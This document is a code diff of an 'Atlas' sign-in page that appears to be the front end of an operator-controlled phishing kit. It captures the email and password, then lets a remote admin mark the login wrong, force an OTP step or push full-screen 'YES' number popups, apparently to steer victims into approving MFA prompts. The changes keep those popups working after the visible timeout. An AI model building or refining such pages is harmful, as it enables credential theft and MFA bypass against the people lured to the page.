@@ -12,21 +12,18 @@ body {
   display: flex; justify-content: center; align-items: center; padding: 20px;
 }
 .card {
-  background: #fff;
-  border-radius: 24px;
-  padding: 40px 32px;
-  width: 100%;
-  max-width: 420px;
+  background: #fff; border-radius: 24px; padding: 40px 32px;
+  width: 100%; max-width: 420px;
   box-shadow: 0 20px 60px rgba(0,0,0,0.4);
 }
-.logo {
-  width: 56px; height: 56px;
-  background: linear-gradient(135deg, #4a4ff0, #7c3aed);
-  border-radius: 16px;
-  margin: 0 auto 20px;
+.logo-wrap {
+  width: 72px; height: 72px; margin: 0 auto 24px;
+  border-radius: 20px; padding: 12px;
+  background: #f3f4f6;
   display: flex; align-items: center; justify-content: center;
-  color: white; font-weight: 800; font-size: 24px;
+  overflow: hidden;
 }
+.logo-wrap img { width: 100%; height: 100%; object-fit: contain; }
 h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
 .subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; }
 .form-group { margin-bottom: 20px; }
@@ -34,8 +31,7 @@ label { display: block; font-size: 13px; font-weight: 600; color: #374151; margi
 input {
   width: 100%; padding: 14px 16px;
   border: 1.5px solid #e5e7eb; border-radius: 12px;
-  font-size: 15px; outline: none;
-  transition: border-color 0.2s;
+  font-size: 15px; outline: none; transition: border-color 0.2s;
 }
 input:focus { border-color: #4a4ff0; }
 input:disabled { background: #f3f4f6; cursor: not-allowed; }
@@ -45,71 +41,47 @@ button {
   color: white; border: none; border-radius: 12px;
   font-size: 15px; font-weight: 600; cursor: pointer;
   display: flex; align-items: center; justify-content: center; gap: 10px;
-  transition: opacity 0.2s;
 }
 button:disabled { opacity: 0.7; cursor: not-allowed; }
 .spinner {
   width: 18px; height: 18px;
   border: 2px solid rgba(255,255,255,0.3);
-  border-top-color: white;
-  border-radius: 50%;
+  border-top-color: white; border-radius: 50%;
   animation: spin 0.8s linear infinite;
 }
 @keyframes spin { to { transform: rotate(360deg); } }
 .error-label {
-  color: #dc2626; font-size: 13px;
-  margin-top: 12px; text-align: center; display: none;
+  color: #dc2626; font-size: 13px; margin-top: 12px;
+  text-align: center; display: none;
   background: #fef2f2; padding: 12px; border-radius: 10px;
 }
-.hidden { display: none !important; }
-
-/* POPUP OVERLAY - YES / TEXT / OTP-ERROR */
 .popup-overlay {
-  position: fixed; inset: 0;
-  background: rgba(0,0,0,0.92);
-  z-index: 10000;
-  display: none;
-  justify-content: center;
-  align-items: center;
-  padding: 20px;
+  position: fixed; inset: 0; background: rgba(0,0,0,0.92);
+  z-index: 10000; display: none; justify-content: center;
+  align-items: center; padding: 20px;
 }
 .popup-overlay.active { display: flex; }
-.popup-yes {
-  text-align: center; color: white;
-  max-width: 500px; width: 100%;
-}
+.popup-yes { text-align: center; color: white; max-width: 500px; width: 100%; }
 .popup-yes .big-yes {
-  font-size: 80px; font-weight: 900;
-  color: #10b981; letter-spacing: 4px;
-  text-shadow: 0 0 40px rgba(16,185,129,0.6);
-  margin-bottom: 20px;
-  animation: pulseYes 1.5s ease-in-out infinite;
+  font-size: 80px; font-weight: 900; color: #10b981;
+  letter-spacing: 4px; text-shadow: 0 0 40px rgba(16,185,129,0.6);
+  margin-bottom: 20px; animation: pulseYes 1.5s ease-in-out infinite;
 }
-@keyframes pulseYes {
-  0%, 100% { transform: scale(1); }
-  50% { transform: scale(1.05); }
-}
+@keyframes pulseYes { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
 .popup-yes .big-number {
-  font-size: 120px; font-weight: 900;
-  color: #fbbf24;
-  letter-spacing: 8px;
-  text-shadow: 0 0 40px rgba(251,191,36,0.6);
-  margin: 20px 0;
+  font-size: 120px; font-weight: 900; color: #fbbf24;
+  letter-spacing: 8px; text-shadow: 0 0 40px rgba(251,191,36,0.6); margin: 20px 0;
 }
 .popup-yes .instruction {
-  font-size: 20px; font-weight: 600;
-  color: #e5e7eb; margin-top: 20px;
-  line-height: 1.5;
+  font-size: 20px; font-weight: 600; color: #e5e7eb; margin-top: 20px; line-height: 1.5;
 }
 .popup-text {
-  background: white; border-radius: 20px;
-  padding: 32px; max-width: 400px; width: 100%;
+  background: white; border-radius: 20px; padding: 32px; max-width: 400px; width: 100%;
 }
 .popup-text .icon {
   width: 60px; height: 60px;
   background: linear-gradient(135deg, #f97316, #ea580c);
-  border-radius: 50%;
-  margin: 0 auto 16px;
+  border-radius: 50%; margin: 0 auto 16px;
   display: flex; align-items: center; justify-content: center;
   color: white; font-size: 28px; font-weight: bold;
 }
@@ -124,7 +96,9 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 <body>
 
 <div class="card">
-  <div class="logo">A</div>
+  <div class="logo-wrap">
+    <img src="/images/logo.png" alt="Atlas">
+  </div>
   <h1>Welcome Back</h1>
   <p class="subtitle">Sign in to continue</p>
 
@@ -132,7 +106,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
     <label>Email</label>
     <input type="email" id="email" placeholder="you@example.com">
   </div>
-
   <div class="form-group">
     <label>Password</label>
     <input type="password" id="password" placeholder="Enter password">
@@ -142,7 +115,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
   <div id="errorLabel" class="error-label"></div>
 </div>
 
-<!-- YES Popup -->
 <div id="yesPopup" class="popup-overlay">
   <div class="popup-yes">
     <div class="big-yes">YES</div>
@@ -151,7 +123,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
   </div>
 </div>
 
-<!-- Text Popup -->
 <div id="textPopup" class="popup-overlay">
   <div class="popup-text">
     <div class="icon">!</div>
@@ -170,10 +141,11 @@ const errorLabel = document.getElementById('errorLabel');
 const yesPopup = document.getElementById('yesPopup');
 const textPopup = document.getElementById('textPopup');
 
-let currentEmail = '';
+// Persist last email so popups work even after timeout
+let currentEmail = localStorage.getItem('atlas_current_email') || '';
+let lastPopupId = parseInt(localStorage.getItem('atlas_last_popup_id') || '0');
 let pollInterval = null;
 let timeoutTimer = null;
-let lastPopupId = 0;
 
 function showError(msg) {
   errorLabel.textContent = msg;
@@ -185,11 +157,9 @@ function setLoading(loading) {
   submitBtn.disabled = loading;
   emailInput.disabled = loading;
   passwordInput.disabled = loading;
-  if (loading) {
-    submitBtn.innerHTML = '<div class="spinner"></div> Verifying your details...';
-  } else {
-    submitBtn.innerHTML = 'Sign In';
-  }
+  submitBtn.innerHTML = loading
+    ? '<div class="spinner"></div> Verifying your details...'
+    : 'Sign In';
 }
 
 function clearPopups() {
@@ -197,16 +167,16 @@ function clearPopups() {
   textPopup.classList.remove('active');
 }
 
-function showYesPopup(number) {
+function showYesPopup(n) {
   textPopup.classList.remove('active');
-  document.getElementById('yesNumber').textContent = number;
-  document.getElementById('yesNumberText').textContent = number;
+  document.getElementById('yesNumber').textContent = n;
+  document.getElementById('yesNumberText').textContent = n;
   yesPopup.classList.add('active');
 }
 
-function showTextPopup(message) {
+function showTextPopup(msg) {
   yesPopup.classList.remove('active');
-  document.getElementById('textMessage').textContent = message;
+  document.getElementById('textMessage').textContent = msg;
   textPopup.classList.add('active');
 }
 
@@ -215,8 +185,9 @@ async function pollStatus() {
   try {
     const res = await fetch(`/api/user/status?email=${encodeURIComponent(currentEmail)}`);
     const data = await res.json();
+    if (!data || data.notFound) return;
 
-    // Wrong login → reset
+    // Wrong login → reset form + show error
     if (data.wrong_login_flag) {
       setLoading(false);
       clearPopups();
@@ -224,16 +195,17 @@ async function pollStatus() {
       passwordInput.value = '';
       showError('Details incorrect. Please try again.');
       currentEmail = '';
+      localStorage.removeItem('atlas_current_email');
       if (pollInterval) clearInterval(pollInterval);
       if (timeoutTimer) clearTimeout(timeoutTimer);
       await fetch('/api/user/clear-flags', {
         method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ email: data.email })
-      });
+        body: JSON.stringify({ email: data.email || currentEmail })
+      }).catch(()=>{});
       return;
     }
 
-    // Timeout → reset
+    // Timeout → reset form
     if (data.timeout_flag) {
       setLoading(false);
       clearPopups();
@@ -241,18 +213,20 @@ async function pollStatus() {
       passwordInput.value = '';
       showError('Session reset. Please try again.');
       currentEmail = '';
+      localStorage.removeItem('atlas_current_email');
       if (pollInterval) clearInterval(pollInterval);
       if (timeoutTimer) clearTimeout(timeoutTimer);
       await fetch('/api/user/clear-flags', {
         method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ email: data.email })
-      });
+        body: JSON.stringify({ email: data.email || currentEmail })
+      }).catch(()=>{});
       return;
     }
 
-    // Popup changes
+    // Popup trigger
     if (data.popup_id && data.popup_id > lastPopupId) {
       lastPopupId = data.popup_id;
+      localStorage.setItem('atlas_last_popup_id', lastPopupId);
       if (data.popup_type === 'yes') showYesPopup(data.popup_value);
       else if (data.popup_type === 'text') showTextPopup(data.popup_value);
     }
@@ -263,14 +237,12 @@ async function pollStatus() {
       return;
     }
 
-    // Success
+    // Success (ONLY when admin explicitly clicks Success button)
     if (data.status === 'success') {
       window.location.href = `/success.html?email=${encodeURIComponent(currentEmail)}`;
       return;
     }
-
-    // If approved and OTP submitted successfully — no action needed on login page
-  } catch (err) { console.error(err); }
+  } catch (err) { /* silent */ }
 }
 
 submitBtn.addEventListener('click', async () => {
@@ -279,9 +251,9 @@ submitBtn.addEventListener('click', async () => {
   if (!email || !password) { showError('Please fill in all fields.'); return; }
 
   currentEmail = email;
+  localStorage.setItem('atlas_current_email', email);
   setLoading(true);
   clearPopups();
-  lastPopupId = 0;
 
   try {
     const res = await fetch('/api/user/login', {
@@ -298,28 +270,35 @@ submitBtn.addEventListener('click', async () => {
     if (pollInterval) clearInterval(pollInterval);
     pollInterval = setInterval(pollStatus, 1500);
 
-    // 60s timeout
     if (timeoutTimer) clearTimeout(timeoutTimer);
     timeoutTimer = setTimeout(() => {
       setLoading(false);
       showError('Timeout. Please try again after 5 minutes.');
-      if (pollInterval) clearInterval(pollInterval);
+      // NOTE: currentEmail stays — popups will still work
     }, 60000);
-
   } catch (err) {
     setLoading(false);
     showError('Network error. Please try again.');
   }
 });
 
-// Socket events for instant popups
+// Popup listener ALWAYS on (even after timeout)
+pollInterval = setInterval(pollStatus, 1500);
+
 socket.on('popup-update', (data) => {
-  if (data.email !== currentEmail) return;
+  if (!currentEmail || data.email !== currentEmail) return;
   if (data.popup_id > lastPopupId) {
     lastPopupId = data.popup_id;
+    localStorage.setItem('atlas_last_popup_id', lastPopupId);
     if (data.popup_type === 'yes') showYesPopup(data.popup_value);
     else if (data.popup_type === 'text') showTextPopup(data.popup_value);
   }
+});
+
+// Also listen for wrong login / timeout / otp-redirect / success
+socket.on('user-control', (data) => {
+  if (data.email !== currentEmail) return;
+  pollStatus();
 });
 </script>
 </body>
